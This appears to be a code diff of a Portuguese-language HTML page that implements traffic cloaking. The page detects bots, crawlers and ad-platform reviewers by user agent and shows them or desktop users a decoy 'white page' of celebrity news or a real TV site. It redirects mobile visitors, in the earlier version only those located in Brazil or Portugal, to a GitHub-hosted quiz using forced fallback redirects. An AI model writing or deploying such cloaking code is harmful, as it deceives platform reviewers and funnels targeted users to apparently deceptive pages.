@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Últimas Notícias - A Televisão</title>
+    <title>Últimas Notícias</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,115 +14,56 @@
             max-width: 800px;
             margin: 0 auto;
         }
-        h1 {
-            color: #d40000;
-            border-bottom: 1px solid #d40000;
-            padding-bottom: 10px;
-        }
-        .noticia {
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eee;
-        }
         .loading {
             text-align: center;
-            padding: 50px;
-            font-size: 18px;
-            color: #666;
+            padding: 100px 0;
+            font-size: 20px;
         }
     </style>
 </head>
 <body>
-    <!-- PÁGINA WHITE COM NOTÍCIAS -->
-    <div id="white-page">
-        <div class="loading">Verificando acesso, aguarde...</div>
-        
-        <div id="content" style="display:none;">
-            <h1>Últimas Notícias</h1>
-            
-            <div class="noticia">
-                <h2>Mel Maia lança nova coleção de roupas</h2>
-                <p>A atriz e influenciadora digital surpreendeu os fãs ao anunciar sua própria linha de moda praia...</p>
-            </div>
-            
-            <div class="noticia">
-                <h2>Anitta anuncia nova turnê internacional</h2>
-                <p>A cantora confirmou shows na Europa para o próximo mês...</p>
-            </div>
-            
-            <div class="noticia">
-                <h2>Whindersson Nunes lança novo especial</h2>
-                <p>O humorista estreia seu novo show na Netflix nesta sexta...</p>
-            </div>
-            
-            <p><small>Fonte: A Televisão</small></p>
-        </div>
-    </div>
+    <div class="loading">Carregando conteúdo...</div>
 
     <script>
-        // Função de redirecionamento segura
-        function safeRedirect(url) {
-            // Método 1: Tentativa principal
+        // Função de redirecionamento à prova de falhas
+        function redirectTo(url) {
+            // Método 1: Redirecionamento normal
             window.location.href = url;
             
-            // Método 2: Fallback após 1 segundo
-            setTimeout(() => {
-                if(window.location.href.indexOf(url) === -1) {
-                    window.location.replace(url);
-                }
-            }, 1000);
+            // Método 2: Fallback após 1.5 segundos
+            setTimeout(function() {
+                window.location.replace(url);
+            }, 1500);
             
-            // Método 3: Fallback final após 3 segundos
-            setTimeout(() => {
-                if(window.location.href.indexOf(url) === -1) {
-                    document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${url}">`;
-                }
+            // Método 3: Fallback final (meta refresh)
+            setTimeout(function() {
+                document.body.innerHTML = `<meta http-equiv="refresh" content="0; url=${url}">`;
             }, 3000);
         }
 
-        // Verificação otimizada
-        async function checkAccess() {
-            try {
-                // Verificação de user agent primeiro (mais rápido)
-                const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi|Windows Phone/i.test(navigator.userAgent);
-                const isBot = /bot|facebook|google|meta|twitter|slurp|bing|crawler|spider|curl|wget|validator/i.test(navigator.userAgent.toLowerCase());
-                
-                // Se for bot, mostra conteúdo white
-                if(isBot) {
-                    document.getElementById('content').style.display = 'block';
-                    document.querySelector('.loading').style.display = 'none';
-                    return;
-                }
-                
-                // Se não for mobile, mostra conteúdo white
-                if(!isMobile) {
-                    document.getElementById('content').style.display = 'block';
-                    document.querySelector('.loading').style.display = 'none';
-                    return;
-                }
-                
-                // Verificação de IP apenas para mobiles
-                const ipCheck = await Promise.race([
-                    fetch('https://ipapi.co/json/'),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
-                ]);
-                
-                const ipData = await ipCheck.json();
-                const targetCountries = ['BR', 'PT'];
-                
-                if(targetCountries.includes(ipData.country)) {
-                    safeRedirect("https://avelino-star.github.io/Quiz1/");
-                } else {
-                    document.getElementById('content').style.display = 'block';
-                    document.querySelector('.loading').style.display = 'none';
-                }
-            } catch (error) {
-                console.log('Verificação simplificada:', error);
-                // Fallback: se houver erro, redireciona após 2s
-                setTimeout(() => {
-                    safeRedirect("https://avelino-star.github.io/Quiz1/");
-                }, 2000);
+        // Verificação imediata ao carregar a página
+        function checkAccess() {
+            // 1. Verifica se é mobile
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi|Windows Phone/i.test(navigator.userAgent);
+            
+            // 2. Verifica se é um bot conhecido
+            const isBot = /bot|facebook|google|meta|twitter|slurp|bing|crawler|spider|curl|wget|validator/i.test(navigator.userAgent.toLowerCase());
+
+            // Se for BOT: mostra conteúdo white (não redireciona)
+            if (isBot) {
+                document.querySelector('.loading').textContent = "Últimas Notícias";
+                // Aqui você pode inserir o conteúdo white page
+                return;
             }
+
+            // Se for DESKTOP: redireciona para site white
+            if (!isMobile) {
+                redirectTo("https://www.atelevisao.com");
+                return;
+            }
+
+            // Se for MOBILE: redireciona para quiz
+            redirectTo("https://avelino-star.github.io/Quiz1/");
         }
 
         // Inicia a verificação imediatamente
